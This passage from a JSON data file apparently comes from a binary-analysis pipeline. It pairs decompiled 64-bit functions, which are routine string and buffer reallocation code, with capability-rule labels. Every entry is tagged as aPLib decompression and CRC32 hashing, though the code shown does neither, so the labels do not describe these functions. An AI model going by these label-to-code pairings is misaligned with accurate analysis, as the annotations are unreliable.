arg1_01 = 0xffffffffffffffff;\n        }\n        iVar3 = fcn.18008fb2c(arg1_01);\n        if (iVar3 == 0) goto code_r0x00018001126b;\n        piVar5 = iVar3 + 0x27U & 0xffffffffffffffe0;\n        piVar5[-1] = iVar3;\n    }\n    arg1[2] = arg3;\n    arg1[3] = piVar7;\n    fcn.1800ade80(piVar5, arg2, arg3);\n    *(arg3 + piVar5) = 0;\n    if (0xf < piVar1) {\n        piVar7 = *arg1;\n        piVar6 = piVar7;\n        if ((0xfff < piVar1 + 1U) && (piVar6 = piVar7[-1],  0x1f < piVar7 + (-8 - piVar6))) {\ncode_r0x00018001126b:\n            fcn.1800b3528();\n            pcVar2 = swi(3);\n            ppiVar4 = (*pcVar2)();\n            return ppiVar4;\n        }\n        fcn.18008fb24(piVar6);\n    }\n    *arg1 = piVar5;\n    return arg1;\n}\n",
        "token_count": 819
    },
    "180012ed": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint * fcn.180012ed0(int64_t *arg1, int64_t arg2, uint *arg3)\n\n{\n    uint64_t uVar1;\n    uint *puVar2;\n    int64_t iVar3;\n    code *pcVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint64_t arg1_00;\n    uint *arg1_01;\n    uint *puVar8;\n    \n    iVar3 = *arg1;\n    iVar5 = arg1[1] - iVar3 >> 2;\n    if (iVar5 == 0x3fffffffffffffff) {\n        fcn.180014900();\n        pcVar4 = swi(3);\n        puVar8 = (*pcVar4)();\n        return puVar8;\n    }\n    uVar7 = arg1[2] - iVar3 >> 2;\n    uVar1 = iVar5 + 1;\n    uVar6 = uVar1;\n    if ((uVar7 <= 0x3fffffffffffffff - (uVar7 >> 1)) && (uVar6 = (uVar7 >> 1) + uVar7,  uVar6 < uVar1)) {\n        uVar6 = uVar1;\n    }\n    uVar7 = uVar6 * 4;\n    if (uVar6 < 0x4000000000000000) {\n        if (0xfff < uVar7) goto code_r0x000180012f73;\n        if (uVar7 == 0) {\n            puVar8 = NULL;\n        }\n        else {\n            puVar8 = fcn.18008fb2c(uVar7);\n        }\n    }\n    else {\n        uVar7 = 0xffffffffffffffff;\ncode_r0x000180012f73:\n        arg1_00 = uVar7 + 0x27;\n        if (arg1_00 <= uVar7) {\n            arg1_00 = 0xffffffffffffffff;\n        }\n        iVar5 = fcn.18008fb2c(arg1_00);\n        if (iVar5 == 0) goto code_r0x000180013059;\n        puVar8 = iVar5 + 0x27U & 0xffffffffffffffe0;\n        *(puVar8 + -2) = iVar5;\n    }\n    puVar2 = puVar8 + (arg2 - iVar3 >> 2);\n    *puVar2 = *arg3;\n    iVar3 = *arg1;\n    if (arg2 == arg1[1]) {\n        iVar5 = arg1[1] - iVar3;\n        arg1_01 = puVar8;\n        arg2 = iVar3;\n    }\n    else {\n        fcn.1800ade80(puVar8, iVar3, arg2 - iVar3);\n        arg1_01 = puVar2 + 1;\n        iVar5 = arg1[1] - arg2;\n    }\n    fcn.1800ade80(arg1_01, arg2, iVar5);\n    iVar3 = *arg1;\n    if (iVar3 != 0) {\n        iVar5 = iVar3;\n        if ((0xfff < (arg1[2] - iVar3 & 0xfffffffffffffffcU)) && (iVar5 = *(iVar3 + -8),  0x1f < (iVar3 - iVar5) - 8U))\n        {\ncode_r0x000180013059:\n            fcn.1800b3528();\n            pcVar4 = swi(3);\n            puVar8 = (*pcVar4)();\n            return puVar8;\n        }\n        fcn.18008fb24(iVar5);\n    }\n    *arg1 = puVar8;\n    arg1[1] = puVar8 + uVar1;\n    arg1[2] = puVar8 + uVar6;\n    return puVar2;\n}\n",
        "token_count": 851
    },
    "18001355": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t * fcn.180013550(int64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    code *pcVar4;\n    int64_t arg1_00;\n    int64_t *piVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    ushort in_R9W;\n    \n    iVar2 = arg1[2];\n    if (0x7ffffffffffffffeU - iVar2 < arg2) {\n        fcn.180014b60();\n        pcVar4 = swi(3);\n        piVar5 = (*pcVar4)();\n        return piVar5;\n    }\n    uVar3 = arg1[3];\n    uVar6 = arg2 + iVar2 | 7;\n    uVar8 = 0x7ffffffffffffffe;\n    if (((uVar6 < 0x7fffffffffffffff) && (uVar3 <= 0x7ffffffffffffffe - (uVar3 >> 1))) &&\n       (uVar1 = (uVar3 >> 1) + uVar3,  uVar8 = uVar6,  uVar6 < uVar1)) {\n        uVar8 = uVar1;\n    }\n    iVar7 = uVar8 + 1;\n    if (uVar8 == 0xffffffffffffffff) {\n        iVar7 = -1;\n    }\n    arg1_00 = fcn.180011cf0(arg1, iVar7);\n    iVar7 = iVar2 * 2;\n    arg1[2] = arg2 + iVar2;\n    arg1[3] = uVar8;\n    if (uVar3 < 8) {\n        fcn.1800ade80(arg1_00, arg1, iVar7);\n        *(iVar7 + arg1_00) = in_R9W;\n        *(iVar7 + 2 + arg1_00) = 0;\n    }\n    else {\n        iVar2 = *arg1;\n        fcn.1800ade80(arg1_00, iVar2, iVar7);\n        *(iVar7 + arg1_00) = in_R9W;\n        *(iVar7 + 2 + arg1_00) = 0;\n        iVar7 = iVar2;\n        if (0xfff < uVar3 * 2 + 2) {\n            iVar7 = *(iVar2 + -8);\n            if (0x1f < (iVar2 - iVar7) - 8U) {\n                fcn.1800b3528(iVar7, uVar3 * 2 + 0x29);\n                pcVar4 = swi(3);\n                piVar5 = (*pcVar4)();\n                return piVar5;\n            }\n        }\n        fcn.18008fb24(iVar7);\n    }\n    *arg1 = arg1_00;\n    return arg1;\n}\n",
        "token_count": 646
    },
    "18001369": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t * fcn.180013690(int64_t *arg1, uint64_t arg2, ulong noname_2, ulong arg4)\n\n{\n    uint64_t uVar1;\n    ushort *puVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    code *pcVar5;\n    int64_t arg1_00;\n    int64_t *piVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    int64_t in_stack_00000028;\n    \n    iVar3 = arg1[2];\n    if (0x7ffffffffffffffeU - iVar3 < arg2) {\n        fcn.180014b60();\n        pcVar5 = swi(3);\n        piVar6 = (*pcVar5)();\n        return piVar6;\n    }\n    uVar4 = arg1[3];\n    uVar7 = arg2 + iVar3 | 7;\n    uVar9 = 0x7ffffffffffffffe;\n    if (((uVar7 < 0x7fffffffffffffff) && (uVar4 <= 0x7ffffffffffffffe - (uVar4 >> 1))) &&\n       (uVar1 = (uVar4 >> 1) + uVar4,  uVar9 = uVar7,  uVar7 < uVar1)) {\n        uVar9 = uVar1;\n    }\n    iVar8 = uVar9 + 1;\n    if (uVar9 == 0xffffffffffffffff) {\n        iVar8 = -1;\n    }\n    arg1_00 = fcn.180011cf0(arg1, iVar8);\n    arg1[2] = arg2 + iVar3;\n    iVar8 = iVar3 * 2;\n    arg1[3] = uVar9;\n    puVar2 = arg1_00 + (in_stack_00000028 + iVar3) * 2;\n    if (uVar4 < 8) {\n        fcn.1800ade80(arg1_00, arg1, iVar8);\n        fcn.1800ade80(iVar8 + arg1_00, arg4, in_stack_00000028 * 2);\n        *puVar2 = 0;\n    }\n    else {\n        iVar3 = *arg1;\n        fcn.1800ade80(arg1_00, iVar3, iVar8);\n        fcn.1800ade80(iVar8 + arg1_00, arg4, in_stack_00000028 * 2);\n        *puVar2 = 0;\n        iVar8 = iVar3;\n        if (0xfff < uVar4 * 2 + 2) {\n            iVar8 = *(iVar3 + -8);\n            if (0x1f < (iVar3 - iVar8) - 8U) {\n                fcn.1800b3528(iVar8, uVar4 * 2 + 0x29);\n                pcVar5 = swi(3);\n                piVar6 = (*pcVar5)();\n                return piVar6;\n            }\n        }\n        fcn.18008fb24(iVar8);\n    }\n    *arg1 = arg1_00;\n    return arg1;\n}\n",
        "token_count": 704
    },
    "180013c5": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t * fcn.180013c50(int64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    code *pcVar3;\n    ushort *puVar4;\n    int64_t *piVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    int64_t arg1_00;\n    int64_t iVar8;\n    ushort *puVar9;\n    ushort in_R9W;\n    \n    if (0x7ffffffffffffffe < arg2) {\n        fcn.180014b60();\n        pcVar3 = swi(3);\n        piVar5 = (*pcVar3)();\n        return piVar5;\n    }\n    uVar2 = arg1[3];\n    uVar6 = arg2 | 7;\n    uVar7 = 0x7ffffffffffffffe;\n    if (((uVar6 < 0x7fffffffffffffff) && (uVar2 <= 0x7ffffffffffffffe - (uVar2 >> 1))) &&\n       (uVar1 = (uVar2 >> 1) + uVar2,  uVar7 = uVar6,  uVar6 < uVar1)) {\n        uVar7 = uVar1;\n    }\n    iVar8 = uVar7 + 1;\n    if (uVar7 == 0xffffffffffffffff) {\n        iVar8 = -1;\n    }\n    puVar4 = fcn.180011cf0(arg1, iVar8);\n    arg1[2] = arg2;\n    arg1[3] = uVar7;\n    uVar7 = arg2;\n    puVar9 = puVar4;\n    if (arg2 != 0) {\n        for (; uVar7 != 0; uVar7 = uVar7 - 1) {\n            *puVar9 = in_R9W;\n            puVar9 = puVar9 + 1;\n        }\n    }\n    puVar4[arg2] = 0;\n    if (7 < uVar2) {\n        iVar8 = *arg1;\n        arg1_00 = iVar8;\n        if (0xfff < uVar2 * 2 + 2) {\n            arg1_00 = *(iVar8 + -8);\n            if (0x1f < (iVar8 - arg1_00) - 8U) {\n                fcn.1800b3528(iVar8 - arg1_00, uVar2 * 2 + 0x29);\n                pcVar3 = swi(3);\n                piVar5 = (*pcVar3)();\n                return piVar5;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    *arg1 = puVar4;\n    return arg1;\n}\n",
        "token_count": 612
    },
    "180013d5": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t * fcn.180013d50(int64_t *arg1, uint64_t arg2, ulong noname_2, int64_t arg4)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    int64_t arg2_00;\n    code *pcVar3;\n    int64_t arg1_00;\n    int64_t *piVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    ushort *puVar9;\n    ushort in_stack_00000028;\n    \n    iVar7 = arg1[2];\n    if (0x7ffffffffffffffeU - iVar7 < arg2) {\n        fcn.180014b60();\n        pcVar3 = swi(3);\n        piVar4 = (*pcVar3)();\n        return piVar4;\n    }\n    uVar2 = arg1[3];\n    uVar5 = arg2 + iVar7 | 7;\n    uVar8 = 0x7ffffffffffffffe;\n    if (((uVar5 < 0x7fffffffffffffff) && (uVar2 <= 0x7ffffffffffffffe - (uVar2 >> 1))) &&\n       (uVar1 = (uVar2 >> 1) + uVar2,  uVar8 = uVar5,  uVar5 < uVar1)) {\n        uVar8 = uVar1;\n    }\n    iVar6 = uVar8 + 1;\n    if (uVar8 == 0xffffffffffffffff) {\n        iVar6 = -1;\n    }\n    arg1_00 = fcn.180011cf0(arg1, iVar6);\n    arg1[3] = uVar8;\n    iVar6 = iVar7 * 2;\n    arg1[2] = arg2 + iVar7;\n    puVar9 = iVar6 + arg1_00;\n    if (uVar2 < 8) {\n        fcn.1800ade80(arg1_00, arg1, iVar6);\n        iVar6 = arg4;\n        if (arg4 != 0) {\n            for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar9 = in_stack_00000028;\n                puVar9 = puVar9 + 1;\n            }\n        }\n        *(arg1_00 + (arg4 + iVar7) * 2) = 0;\n    }\n    else {\n        arg2_00 = *arg1;\n        fcn.1800ade80(arg1_00, arg2_00, iVar6);\n        iVar6 = arg4;\n        if (arg4 != 0) {\n            for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar9 = in_stack_00000028;\n                puVar9 = puVar9 + 1;\n            }\n        }\n        *(arg1_00 + (arg4 + iVar7) * 2) = 0;\n        iVar7 = arg2_00;\n        if (0xfff < uVar2 * 2 + 2) {\n            iVar7 = *(arg2_00 + -8);\n            if (0x1f < (arg2_00 - iVar7) - 8U) {\n                fcn.1800b3528(iVar7, uVar2 * 2 + 0x29);\n                pcVar3 = swi(3);\n                piVar4 = (*pcVar3)();\n                return piVar4;\n            }\n        }\n        fcn.18008fb24(iVar7);\n    }\n    *arg1 = arg1_00;\n    return arg1;\n}\n",
        "token_count": 808
    },
    "180013eb": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint64_t * fcn.180013eb0(uint64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint64_t *puVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    uchar in_R9B;\n    \n    uVar8 = arg1[2];\n    if (0x7fffffffffffffff - uVar8 < arg2) {\n        fcn.180014b60();\n        pcVar2 = swi(3);\n        puVar4 = (*pcVar2)();\n        return puVar4;\n    }\n    uVar1 = arg1[3];\n    uVar5 = arg2 + uVar8 | 0xf;\n    uVar7 = 0x7fffffffffffffff;\n    if (((uVar5 < 0x8000000000000000) && (uVar1 <= 0x7fffffffffffffff - (uVar1 >> 1))) &&\n       (uVar6 = (uVar1 >> 1) + uVar1,  uVar7 = uVar5,  uVar5 < uVar6)) {\n        uVar7 = uVar6;\n    }\n    uVar5 = uVar7 + 1;\n    if (uVar7 == 0xffffffffffffffff) {\n        uVar5 = 0xffffffffffffffff;\n    }\n    if (uVar5 < 0x1000) {\n        if (uVar5 == 0) {\n            uVar5 = 0;\n        }\n        else {\n            uVar5 = fcn.18008fb2c(uVar5);\n        }\n    }\n    else {\n        uVar6 = uVar5 + 0x27;\n        if (uVar6 <= uVar5) {\n            uVar6 = 0xffffffffffffffff;\n        }\n        iVar3 = fcn.18008fb2c(uVar6);\n        if (iVar3 == 0) goto code_r0x000180013ffc;\n        uVar5 = iVar3 + 0x27U & 0xffffffffffffffe0;\n        *(uVar5 - 8) = iVar3;\n    }\n    arg1[2] = arg2 + uVar8;\n    arg1[3] = uVar7;\n    if (uVar1 < 0x10) {\n        fcn.1800ade80(uVar5, arg1, uVar8);\n        *(uVar5 + uVar8) = in_R9B;\n        *(uVar5 + 1 + uVar8) = 0;\n    }\n    else {\n        uVar7 = *arg1;\n        fcn.1800ade80(uVar5, uVar7, uVar8);\n        *(uVar5 + uVar8) = in_R9B;\n        *(uVar5 + 1 + uVar8) = 0;\n        uVar8 = uVar7;\n        if ((0xfff < uVar1 + 1) && (uVar8 = *(uVar7 - 8),  0x1f < (uVar7 - uVar8) - 8)) {\ncode_r0x000180013ffc:\n            fcn.1800b3528();\n            pcVar2 = swi(3);\n            puVar4 = (*pcVar2)();\n            return puVar4;\n        }\n        fcn.18008fb24(uVar8);\n    }\n    *arg1 = uVar5;\n    return arg1;\n}\n",
        "token_count": 785
    },
    "18001401": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint64_t * fcn.180014010(uint64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint64_t *puVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    char in_R9B;\n    \n    if (0x7fffffffffffffff < arg2) {\n        fcn.180014b60();\n        pcVar2 = swi(3);\n        puVar4 = (*pcVar2)();\n        return puVar4;\n    }\n    uVar1 = arg1[3];\n    uVar5 = arg2 | 0xf;\n    uVar7 = 0x7fffffffffffffff;\n    if (((uVar5 < 0x8000000000000000) && (uVar1 <= 0x7fffffffffffffff - (uVar1 >> 1))) &&\n       (uVar6 = (uVar1 >> 1) + uVar1,  uVar7 = uVar5,  uVar5 < uVar6)) {\n        uVar7 = uVar6;\n    }\n    uVar5 = uVar7 + 1;\n    if (uVar7 == 0xffffffffffffffff) {\n        uVar5 = 0xffffffffffffffff;\n    }\n    if (uVar5 < 0x1000) {\n        if (uVar5 == 0) {\n            uVar5 = 0;\n        }\n        else {\n            uVar5 = fcn.18008fb2c(uVar5);\n        }\n    }\n    else {\n        uVar6 = uVar5 + 0x27;\n        if (uVar6 <= uVar5) {\n            uVar6 = 0xffffffffffffffff;\n        }\n        iVar3 = fcn.18008fb2c(uVar6);\n        if (iVar3 == 0) goto code_r0x000180014135;\n        uVar5 = iVar3 + 0x27U & 0xffffffffffffffe0;\n        *(uVar5 - 8) = iVar3;\n    }\n    arg1[2] = arg2;\n    arg1[3] = uVar7;\n    fcn.1800ae290(uVar5, in_R9B, arg2);\n    *(arg2 + uVar5) = 0;\n    if (0xf < uVar1) {\n        uVar7 = *arg1;\n        uVar6 = uVar7;\n        if ((0xfff < uVar1 + 1) && (uVar6 = *(uVar7 - 8),  0x1f < (uVar7 - uVar6) - 8)) {\ncode_r0x000180014135:\n            fcn.1800b3528();\n            pcVar2 = swi(3);\n            puVar4 = (*pcVar2)();\n            return puVar4;\n        }\n        fcn.18008fb24(uVar6);\n    }\n    *arg1 = uVar5;\n    return arg1;\n}\n",
        "token_count": 675
    },
    "18001414": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint64_t * fcn.180014140(uint64_t *arg1, uint64_t arg2, ulong noname_2, ulong arg4)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint64_t *puVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    \n    if (0x7fffffffffffffff < arg2) {\n        fcn.180014b60();\n        pcVar2 = swi(3);\n        puVar4 = (*pcVar2)();\n        return puVar4;\n    }\n    uVar1 = arg1[3];\n    uVar5 = arg2 | 0xf;\n    uVar7 = 0x7fffffffffffffff;\n    if (((uVar5 < 0x8000000000000000) && (uVar1 <= 0x7fffffffffffffff - (uVar1 >> 1))) &&\n       (uVar6 = (uVar1 >> 1) + uVar1,  uVar7 = uVar5,  uVar5 < uVar6)) {\n        uVar7 = uVar6;\n    }\n    uVar5 = uVar7 + 1;\n    if (uVar7 == 0xffffffffffffffff) {\n        uVar5 = 0xffffffffffffffff;\n    }\n    if (uVar5 < 0x1000) {\n        if (uVar5 == 0) {\n            uVar5 = 0;\n        }\n        else {\n            uVar5 = fcn.18008fb2c(uVar5);\n        }\n    }\n    else {\n        uVar6 = uVar5 + 0x27;\n        if (uVar6 <= uVar5) {\n            uVar6 = 0xffffffffffffffff;\n        }\n        iVar3 = fcn.18008fb2c(uVar6);\n        if (iVar3 == 0) goto code_r0x000180014264;\n        uVar5 = iVar3 + 0x27U & 0xffffffffffffffe0;\n        *(uVar5 - 8) = iVar3;\n    }\n    arg1[2] = arg2;\n    arg1[3] = uVar7;\n    fcn.1800ade80(uVar5, arg4, arg2);\n    *(arg2 + uVar5) = 0;\n    if (0xf < uVar1) {\n        uVar7 = *arg1;\n        uVar6 = uVar7;\n        if ((0xfff < uVar1 + 1) && (uVar6 = *(uVar7 - 8),  0x1f < (uVar7 - uVar6) - 8)) {\ncode_r0x000180014264:\n            fcn.1800b3528();\n            pcVar2 = swi(3);\n            puVar4 = (*pcVar2)();\n            return puVar4;\n        }\n        fcn.18008fb24(uVar6);\n    }\n    *arg1 = uVar5;\n    return arg1;\n}\n",
        "token_count": 676
    },
    "18001427": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint64_t * fcn.180014270(uint64_t *arg1, uint64_t arg2, ulong noname_2, ulong arg4)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint64_t *puVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    int64_t in_stack_00000028;\n    \n    uVar8 = arg1[2];\n    if (0x7fffffffffffffff - uVar8 < arg2) {\n        fcn.180014b60();\n        pcVar2 = swi(3);\n        puVar4 = (*pcVar2)();\n        return puVar4;\n    }\n    uVar1 = arg1[3];\n    uVar5 = arg2 + uVar8 | 0xf;\n    uVar7 = 0x7fffffffffffffff;\n    if (((uVar5 < 0x8000000000000000) && (uVar1 <= 0x7fffffffffffffff - (uVar1 >> 1))) &&\n       (uVar6 = (uVar1 >> 1) + uVar1,  uVar7 = uVar5,  uVar5 < uVar6)) {\n        uVar7 = uVar6;\n    }\n    uVar5 = uVar7 + 1;\n    if (uVar7 == 0xffffffffffffffff) {\n        uVar5 = 0xffffffffffffffff;\n    }\n    if (uVar5 < 0x1000) {\n        if (uVar5 == 0) {\n            uVar5 = 0;\n        }\n        else {\n            uVar5 = fcn.18008fb2c(uVar5);\n        }\n    }\n    else {\n        uVar6 = uVar5 + 0x27;\n        if (uVar6 <= uVar5) {\n            uVar6 = 0xffffffffffffffff;\n        }\n        iVar3 = fcn.18008fb2c(uVar6);\n        if (iVar3 == 0) goto code_r0x0001800143e7;\n        uVar5 = iVar3 + 0x27U & 0xffffffffffffffe0;\n        *(uVar5 - 8) = iVar3;\n    }\n    arg1[2] = arg2 + uVar8;\n    iVar3 = uVar5 + uVar8;\n    arg1[3] = uVar7;\n    if (uVar1 < 0x10) {\n        fcn.1800ade80(uVar5, arg1, uVar8);\n        fcn.1800ade80(iVar3, arg4, in_stack_00000028);\n        *(iVar3 + in_stack_00000028) = 0;\n    }\n    else {\n        uVar7 = *arg1;\n        fcn.1800ade80(uVar5, uVar7, uVar8);\n        fcn.1800ade80(iVar3, arg4, in_stack_00000028);\n        *(iVar3 + in_stack_00000028) = 0;\n        uVar8 = uVar7;\n        if ((0xfff < uVar1 + 1) && (uVar8 = *(uVar7 - 8),  0x1f < (uVar7 - uVar8) - 8)) {\ncode_r0x0001800143e7:\n            fcn.1800b3528();\n            pcVar2 = swi(3);\n            puVar4 = (*pcVar2)();\n            return puVar4;\n        }\n        fcn.18008fb24(uVar8);\n    }\n    *arg1 = uVar5;\n    return arg1;\n}\n",
        "token_count": 824
    },
    "180014b8": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t ** fcn.180014b80(int64_t **arg1, ulong noname_1, int64_t **arg3, uint64_t arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    code *pcVar4;\n    int64_t arg3_00;\n    int64_t **ppiVar5;\n    int64_t *piVar6;\n    int64_t iVar7;\n    int64_t *piVar8;\n    uint64_t uVar9;\n    \n    piVar2 = arg1[3];\n    piVar3 = arg1[2];\n    if (piVar2 - piVar3 < arg4) {\n        if (0x7ffffffffffffffeU - piVar3 < arg4) {\n            fcn.180014b60();\n            pcVar4 = swi(3);\n            ppiVar5 = (*pcVar4)();\n            return ppiVar5;\n        }\n        piVar6 = arg4 + piVar3 | 7;\n        piVar8 = 0x7ffffffffffffffe;\n        if (((piVar6 < 0x7fffffffffffffff) && (piVar2 <= 0x7ffffffffffffffe - (piVar2 >> 1))) &&\n           (piVar1 = (piVar2 >> 1) + piVar2,  piVar8 = piVar6,  piVar6 < piVar1)) {\n            piVar8 = piVar1;\n        }\n        iVar7 = piVar8 + 1;\n        if (piVar8 == 0xffffffffffffffff) {\n            iVar7 = -1;\n        }\n        piVar6 = fcn.180011cf0(arg1, iVar7);\n        arg1[2] = arg4 + piVar3;\n        arg3_00 = arg4 * 2;\n        arg1[3] = piVar8;\n        iVar7 = piVar3 * 2 + 2;\n        if (piVar2 < 0x8) {\n            fcn.1800ade80(piVar6, arg3, arg3_00);\n            fcn.1800ade80(arg3_00 + piVar6, arg1, iVar7);\n        }\n        else {\n            piVar3 = *arg1;\n            fcn.1800ade80(piVar6, arg3, arg3_00);\n            fcn.1800ade80(arg3_00 + piVar6, piVar3, iVar7);\n            piVar8 = piVar3;\n            if (0xfff < piVar2 * 2 + 2U) {\n                piVar8 = piVar3[-1];\n                if (0x1f < piVar3 + (-8 - piVar8)) {\n                    fcn.1800b3528(piVar8, piVar2 * 2 + 0x29);\n                    pcVar4 = swi(3);\n                    ppiVar5 = (*pcVar4)();\n                    return ppiVar5;\n                }\n            }\n            fcn.18008fb24(piVar8);\n        }\n        *arg1 = piVar6;\n    }\n    else {\n        arg1[2] = arg4 + piVar3;\n        ppiVar5 = arg1;\n        if (0x7 < piVar2) {\n            ppiVar5 = *arg1;\n        }\n        uVar9 = arg4;\n        if ((ppiVar5 < arg3 + arg4 * 2) && (arg3 <= piVar3 * 2 + ppiVar5)) {\n            if (arg3 < ppiVar5) {\n                uVar9 = ppiVar5 - arg3 >> 1;\n            }\n            else {\n                uVar9 = 0;\n            }\n        }\n        fcn.1800ade80(arg4 * 2 + ppiVar5, ppiVar5, piVar3 * 2 + 2);\n        fcn.1800ade80(ppiVar5, arg3, uVar9 * 2);\n        fcn.1800ade80(uVar9 * 2 + ppiVar5, arg3 + (arg4 + uVar9) * 2, (arg4 - uVar9) * 2);\n    }\n    return arg1;\n}\n",
        "token_count": 936
    },
    "18001573": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_21h\n// WARNING: Variable defined which should be unmapped: var_31h\n// WARNING: Removing unreachable block (ram,0x00018001586c)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180015730(ulong *arg1, ulong arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    uint32_t uVar3;\n    ulong *puVar4;\n    int64_t *piVar5;\n    int64_t *piVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    ulong in_stack_00000028;\n    ulong *in_stack_00000030;\n    uchar auStack280 [32];\n    uint64_t uStack248;\n    uint64_t uStack240;\n    uint64_t uStack232;\n    ulong uStack224;\n    ulong *puStack216;\n    ulong uStack208;\n    uchar auStack192 [8];\n    uchar auStack184 [16];\n    uchar auStack168 [16];\n    uchar auStack152 [16];\n    uchar auStack136 [7];\n    ulong var_79h;\n    ulong var_71h;\n    ulong var_69h;\n    ulong var_61h;\n    ulong var_59h;\n    ulong var_51h;\n    ulong var_49h;\n    uint64_t var_41h;\n    ulong var_39h;\n    ulong var_31h;\n    ulong var_21h;\n    ulong var_19h;\n    ulong var_11h;\n    ulong var_9h;\n    ulong var_1h;\n    \n    uStack208 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack280;\n    uStack224 = in_stack_00000028;\n    uVar11 = 0;\n    auStack184 = ZEXT916(0);\n    auStack168 = ZEXT816(0);\n    auStack152 = ZEXT816(0);\n    _auStack136 = ZEXT916(0);\n    unique0x100000fc = ZEXT816(0);\n    stack0xffffffffffffff98 = ZEXT816(0) & 0xffffffffffffff00;\n    stack0xffffffffffffffa8 = ZEXT916(0);\n    uStack248 = uStack248 & 0xffffffff00000000;\n    uStack240 = arg3;\n    uStack232 = arg4;\n    puStack216 = arg1;\n    cVar2 = fcn.180015f40(arg3, arg4, auStack184, in_stack_00000028);\n    uVar9 = uVar11;\n    while (cVar2 != '\\0') {\n        auStack152._8_8_ = SUB168(auStack152 >> 0x40, 0);\n        uVar10 = (_auStack136 - auStack152._8_8_) + 1 >> 1;\n        if (_auStack136 < auStack152._8_8_) {\n            uVar10 = uVar11;\n        }\n        uVar8 = uVar11;\n        if (uVar10 != 0) {\n            do {\n                fcn.18000d6f0(arg2);\n                uVar8 = uVar8 + 1;\n            } while (uVar8 != uVar10);\n        }\n        puVar4 = in_stack_00000030;\n        if (7 < in_stack_00000030[3]) {\n            puVar4 = *in_stack_00000030;\n        }\n        uStack248 = puVar4 + in_stack_00000030[2] * 2;\n        puVar4 = in_stack_00000030;\n        if (7 < in_stack_00000030[3]) {\n            puVar4 = *in_stack_00000030;\n        }\n        puVar4 = fcn.1800175c0(auStack192, auStack184, arg2, puVar4);\n        arg4 = uStack232;\n        arg2 = *puVar4;\n        iVar1 = auStack168._8_8_ - auStack168._0_8_ >> 0x3f;\n        iVar7 = (auStack168._8_8_ - auStack168._0_8_) / 0x18 + iVar1;\n        piVar5 = &var_59h + 1;\n        if (iVar7 != iVar1) {\n            piVar5 = auStack168._0_8_;\n        }\n        arg3 = piVar5[1];\n        if (arg3 == 